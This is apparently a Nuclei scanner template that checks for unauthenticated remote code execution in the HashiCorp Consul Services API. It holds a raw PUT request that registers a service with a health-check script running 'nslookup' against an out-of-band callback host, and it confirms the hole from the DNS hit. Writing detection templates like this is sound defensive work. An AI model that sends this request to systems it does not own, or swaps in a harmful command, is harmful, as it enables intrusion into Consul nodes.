id: hashicorp-consul-rce
info:
  name: Hashicorp Consul Services API - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: The vulnerability in Hashicorp Consul Services API allows remote attackers
    to execute commands on Consul nodes.
  reference:
  - https://www.exploit-db.com/exploits/46074
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: hashicorp,rce,oast,intrusive,edb
  metadata:
    impact: The impact of the hashicorp-consul-rce vulnerability is that attackers
      can remotely execute harmful code on Consul nodes, potentially causing a range
      of negative consequences such as data theft, system downtime, or unauthorized
      access.
    recommendation: It is recommended that immediate action is taken to patch the
      vulnerability and secure Hashicorp Consul Services API against remote code execution
      attacks.
requests:
- raw:
  - "PUT /v1/agent/service/register HTTP/1.1\nHost: {{Hostname}}\n\n{\n  \"ID\": \"\
    {{randstr}}\",\n  \"Name\": \"{{randstr}}\",\n  \"Address\": \"127.0.0.1\",\n\
    \  \"Port\": 80,\n  \"check\": {\n    \"script\": \"nslookup {{interactsh-url}}\"\
    ,\n    \"interval\": \"10s\",\n    \"Timeout\": \"86400s\"\n  }\n}\n"
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
